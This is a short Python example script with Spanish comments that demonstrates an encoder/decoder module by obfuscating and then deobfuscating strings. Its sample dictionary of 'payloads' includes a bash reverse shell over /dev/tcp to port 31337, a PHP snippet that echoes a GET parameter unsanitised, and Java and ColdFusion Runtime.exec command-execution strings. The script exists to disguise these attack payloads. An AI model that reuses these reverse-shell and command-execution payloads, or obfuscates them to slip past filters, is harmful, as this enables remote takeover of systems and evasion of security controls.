import lazyencoder_decoder as ed

# Ejemplo con una cadena
input_string = "Hola, Mundo!"
shift_value = 3
substitution_key = "clave"

# Ofuscar la cadena
encoded_string = ed.encode(input_string, shift_value, substitution_key)
print(f"Encoded string: {encoded_string}")

# Desofuscar la cadena
decoded_string = ed.decode(encoded_string, shift_value, substitution_key)
print(f"Decoded string: {decoded_string}")
lhost = rhost = '127.0.0.1'
cmd = 'ls'
# Ejemplo con una lista de cadenas
payloads = {
    "php1": "bash -i >& /dev/tcp/{lhost}/31337 0>&1",
    "php2": "<?php echo($_GET['apellido']); ?>",
    'Java': f"Runtime.getRuntime().exec(echo 'hola mundo')",
    'ColdFusion': f"#CreateObject(\"java\", \"java.lang.Runtime\").getRuntime().exec(variables.cmd)#"
}

# Ofuscar el diccionario de cadenas
encoded_dict = {key: ed.encode(value, shift_value, substitution_key) for key, value in payloads.items()}
print(f"Encoded dict: {encoded_dict}")

# Desofuscar el diccionario de cadenas
decoded_dict = {key: ed.decode(value, shift_value, substitution_key) for key, value in encoded_dict.items()}
print(f"Decoded dict: {decoded_dict}")
